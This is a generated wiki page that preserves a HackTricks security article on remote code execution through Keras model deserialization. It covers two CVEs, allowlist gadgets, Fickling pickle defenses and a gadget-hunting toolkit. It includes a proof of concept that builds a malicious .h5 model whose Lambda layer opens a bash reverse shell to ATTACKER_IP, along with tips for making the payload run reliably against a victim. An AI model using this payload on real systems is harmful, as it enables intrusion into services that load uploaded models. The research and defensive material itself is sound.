---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Keras Model Deserialization RCE and Gadget Hunting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-methodologies-and-resources-python-keras-model-deserialization-rce-and-gadget-hunting` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Keras Model Deserialization RCE and Gadget Hunting](../../topics/generic-methodologies-and-resources/keras-model-deserialization-rce-and-gadget-hunting.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-generic-methodologies-and-resources-python-keras-model-deserialization-rce-and-gadget-hunting |
| name | Keras Model Deserialization RCE and Gadget Hunting |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md |

## Preserved Source Material

````yaml
_body: "# Keras Model Deserialization RCE and Gadget Hunting\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThis\
  \ page summarizes practical exploitation techniques against the Keras model deserialization pipeline, explains the native\
  \ .keras format internals and attack surface, and provides a researcher toolkit for finding Model File Vulnerabilities (MFVs)\
  \ and post-fix gadgets.\n\n## .keras model format internals\n\nA .keras file is a ZIP archive containing at least:\n- metadata.json\
  \ – generic info (e.g., Keras version)\n- config.json – model architecture (primary attack surface)\n- model.weights.h5\
  \ – weights in HDF5\n\nThe config.json drives recursive deserialization: Keras imports modules, resolves classes/functions\
  \ and reconstructs layers/objects from attacker-controlled dictionaries.\n\nExample snippet for a Dense layer object:\n\n\
  ```json\n{\n  \"module\": \"keras.layers\",\n  \"class_name\": \"Dense\",\n  \"config\": {\n    \"units\": 64,\n    \"activation\"\
  : {\n      \"module\": \"keras.activations\",\n      \"class_name\": \"relu\"\n    },\n    \"kernel_initializer\": {\n \
  \     \"module\": \"keras.initializers\",\n      \"class_name\": \"GlorotUniform\"\n    }\n  }\n}\n```\n\nDeserialization\
  \ performs:\n- Module import and symbol resolution from module/class_name keys\n- from_config(...) or constructor invocation\
  \ with attacker-controlled kwargs\n- Recursion into nested objects (activations, initializers, constraints, etc.)\n\nHistorically,\
  \ this exposed three primitives to an attacker crafting config.json:\n- Control of what modules are imported\n- Control\
  \ of which classes/functions are resolved\n- Control of kwargs passed into constructors/from_config\n\n## CVE-2024-3660\
  \ – Lambda-layer bytecode RCE\n\nRoot cause:\n- Lambda.from_config() used python_utils.func_load(...) which base64-decodes\
  \ and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.\n\nExploit idea (simplified payload\
  \ in config.json):\n\n```json\n{\n  \"module\": \"keras.layers\",\n  \"class_name\": \"Lambda\",\n  \"config\": {\n    \"\
  name\": \"exploit_lambda\",\n    \"function\": {\n      \"function_type\": \"lambda\",\n      \"bytecode_b64\": \"<attacker_base64_marshal_payload>\"\
  \n    }\n  }\n}\n```\n\nMitigation:\n- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are\
  \ blocked unless a user explicitly opts out with safe_mode=False.\n\nNotes:\n- Legacy formats (older HDF5 saves) or older\
  \ codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.\n\
  \n## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8\n\nRoot cause:\n- _retrieve_class_or_fn used unrestricted importlib.import_module()\
  \ with attacker-controlled module strings from config.json.\n- Impact: Arbitrary import of any installed module (or attacker-planted\
  \ module on sys.path). Import-time code runs, then object construction occurs with attacker kwargs.\n\nExploit idea:\n\n\
  ```json\n{\n  \"module\": \"maliciouspkg\",\n  \"class_name\": \"Danger\",\n  \"config\": {\"arg\": \"val\"}\n}\n```\n\n\
  Security improvements (Keras ≥ 3.9):\n- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub,\
  \ keras_cv, keras_nlp\n- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading\n- Basic type\
  \ checking: deserialized objects must match expected types\n\n## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda\
  \ RCE\n\nMany production stacks still accept legacy TensorFlow-Keras HDF5 model files (.h5). If an attacker can upload a\
  \ model that the server later loads or runs inference on, a Lambda layer can execute arbitrary Python on load/build/predict.\n\
  \nMinimal PoC to craft a malicious .h5 that executes a reverse shell when deserialized or used:\n\n```python\nimport tensorflow\
  \ as tf\n\ndef exploit(x):\n    import os\n    os.system(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\")\n    return\
  \ x\n\nm = tf.keras.Sequential()\nm.add(tf.keras.layers.Input(shape=(64,)))\nm.add(tf.keras.layers.Lambda(exploit))\nm.compile()\n\
  m.save(\"exploit.h5\")  # legacy HDF5 container\n```\n\nNotes and reliability tips:\n- Trigger points: code may run multiple\
  \ times (e.g., during layer build/first call, model.load_model, and predict/fit). Make payloads idempotent.\n- Version pinning:\
  \ match the victim’s TF/Keras/Python to avoid serialization mismatches. For example, build artifacts under Python 3.8 with\
  \ TensorFlow 2.13.1 if that’s what the target uses.\n- Quick environment replication:\n\n```dockerfile\nFROM python:3.8-slim\n\
  RUN pip install tensorflow-cpu==2.13.1\n```\n\n- Validation: a benign payload like os.system(\"ping -c 1 YOUR_IP\") helps\
  \ confirm execution (e.g., observe ICMP with tcpdump) before switching to a reverse shell.\n\n## Post-fix gadget surface\
  \ inside allowlist\n\nEven with allowlisting and safe mode, a broad surface remains among allowed Keras callables. For example,\
  \ keras.utils.get_file can download arbitrary URLs to user-selectable locations.\n\nGadget via Lambda that references an\
  \ allowed function (not serialized Python bytecode):\n\n```json\n{\n  \"module\": \"keras.layers\",\n  \"class_name\": \"\
  Lambda\",\n  \"config\": {\n    \"name\": \"dl\",\n    \"function\": {\"module\": \"keras.utils\", \"class_name\": \"get_file\"\
  },\n    \"arguments\": {\n      \"fname\": \"artifact.bin\",\n      \"origin\": \"https://example.com/artifact.bin\",\n\
  \      \"cache_dir\": \"/tmp/keras-cache\"\n    }\n  }\n}\n```\n\nImportant limitation:\n- Lambda.call() prepends the input\
  \ tensor as the first positional argument when invoking the target callable. Chosen gadgets must tolerate an extra positional\
  \ arg (or accept *args/**kwargs). This constrains which functions are viable.\n\n## ML pickle import allowlisting for AI/ML\
  \ models (Fickling)\n\nMany AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts,\
  \ etc.) embed Python pickle data. Attackers routinely abuse pickle GLOBAL imports and object constructors to achieve RCE\
  \ or model swapping during load. Blacklist-based scanners often miss novel or unlisted dangerous imports.\n\nA practical\
  \ fail-closed defense is to hook Python’s pickle deserializer and only allow a reviewed set of harmless ML-related imports\
  \ during unpickling. Trail of Bits’ Fickling implements this policy and ships a curated ML import allowlist built from thousands\
  \ of public Hugging Face pickles.\n\nSecurity model for “safe” imports (intuitions distilled from research and practice):\
  \ imported symbols used by a pickle must simultaneously:\n- Not execute code or cause execution (no compiled/source code\
  \ objects, shelling out, hooks, etc.)\n- Not get/set arbitrary attributes or items\n- Not import or obtain references to\
  \ other Python objects from the pickle VM\n- Not trigger any secondary deserializers (e.g., marshal, nested pickle), even\
  \ indirectly\n\nEnable Fickling’s protections as early as possible in process startup so that any pickle loads performed\
  \ by frameworks (torch.load, joblib.load, etc.) are checked:\n\n```python\nimport fickling\n# Sets global hooks on the stdlib\
  \ pickle module\nfickling.hook.activate_safe_ml_environment()\n```\n\nOperational tips:\n- You can temporarily disable/re-enable\
  \ the hooks where needed:\n\n```python\nfickling.hook.deactivate_safe_ml_environment()\n# ... load fully trusted files only\
  \ ...\nfickling.hook.activate_safe_ml_environment()\n```\n\n- If a known-good model is blocked, extend the allowlist for\
  \ your environment after reviewing the symbols:\n\n```python\nfickling.hook.activate_safe_ml_environment(also_allow=[\n\
  \    \"package.subpackage.safe_symbol\",\n    \"another.safe.import\",\n])\n```\n\n- Fickling also exposes generic runtime\
  \ guards if you prefer more granular control:\n  - fickling.always_check_safety() to enforce checks for all pickle.load()\n\
  \  - with fickling.check_safety(): for scoped enforcement\n  - fickling.load(path) / fickling.is_likely_safe(path) for one-off\
  \ checks\n\n- Prefer non-pickle model formats when possible (e.g., SafeTensors). If you must accept pickle, run loaders\
  \ under least privilege without network egress and enforce the allowlist.\n\nThis allowlist-first strategy demonstrably\
  \ blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic\
  \ malicious files and allowed ~99% of clean files from top Hugging Face repos.\n\n\n## Researcher toolkit\n\n1) Systematic\
  \ gadget discovery in allowed modules\n\nEnumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and\
  \ prioritize those with file/network/process/env side effects.\n\n<details>\n<summary>Enumerate potentially dangerous callables\
  \ in allowlisted Keras modules</summary>\n\n```python\nimport importlib, inspect, pkgutil\n\nALLOWLIST = [\"keras\", \"\
  keras_nlp\", \"keras_cv\", \"keras_hub\"]\n\nseen = set()\n\ndef iter_modules(mod):\n    if not hasattr(mod, \"__path__\"\
  ):\n        return\n    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + \".\"):\n        yield m.name\n\ncandidates\
  \ = []\nfor root in ALLOWLIST:\n    try:\n        r = importlib.import_module(root)\n    except Exception:\n        continue\n\
  \    for name in iter_modules(r):\n        if name in seen:\n            continue\n        seen.add(name)\n        try:\n\
  \            m = importlib.import_module(name)\n        except Exception:\n            continue\n        for n, obj in inspect.getmembers(m):\n\
  \            if inspect.isfunction(obj) or inspect.isclass(obj):\n                sig = None\n                try:\n   \
  \                 sig = str(inspect.signature(obj))\n                except Exception:\n                    pass\n     \
  \           doc = (inspect.getdoc(obj) or \"\").lower()\n                text = f\"{name}.{n} {sig} :: {doc}\"\n       \
  \         # Heuristics: look for I/O or network-ish hints\n                if any(x in doc for x in [\"download\", \"file\"\
  , \"path\", \"open\", \"url\", \"http\", \"socket\", \"env\", \"process\", \"spawn\", \"exec\"]):\n                    candidates.append(text)\n\
  \nprint(\"\\n\".join(sorted(candidates)[:200]))\n```\n\n</details>\n\n2) Direct deserialization testing (no .keras archive\
  \ needed)\n\nFeed crafted dicts directly into Keras deserializers to learn accepted params and observe side effects.\n\n\
  ```python\nfrom keras import layers\n\ncfg = {\n  \"module\": \"keras.layers\",\n  \"class_name\": \"Lambda\",\n  \"config\"\
  : {\n    \"name\": \"probe\",\n    \"function\": {\"module\": \"keras.utils\", \"class_name\": \"get_file\"},\n    \"arguments\"\
  : {\"fname\": \"x\", \"origin\": \"https://example.com/x\"}\n  }\n}\n\nlayer = layers.deserialize(cfg, safe_mode=True) \
  \ # Observe behavior\n```\n\n3) Cross-version probing and formats\n\nKeras exists in multiple codebases/eras with different\
  \ guardrails and formats:\n- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)\n- tf-keras:\
  \ maintained separately\n- Multi-backend Keras 3 (official): introduced native .keras\n\nRepeat tests across codebases and\
  \ formats (.keras vs legacy HDF5) to uncover regressions or missing guards.\n\n## References\n\n- [Hunting Vulnerabilities\
  \ in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)\n\
  - [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)\n- [CVE-2024-3660 –\
  \ Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)\n- [CVE-2025-1550 – Keras arbitrary\
  \ module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)\n- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)\n\
  - [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)\n- [HTB Artificial\
  \ – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)\n- [Trail of Bits blog – Fickling’s\
  \ new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)\n- [Fickling\
  \ – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)\n- [Fickling\
  \ pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)\n- [Picklescan](https://github.com/mmaitre314/picklescan),\
  \ [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)\n\
  - [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)\n\
  - [SafeTensors project](https://github.com/safetensors/safetensors)\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
````
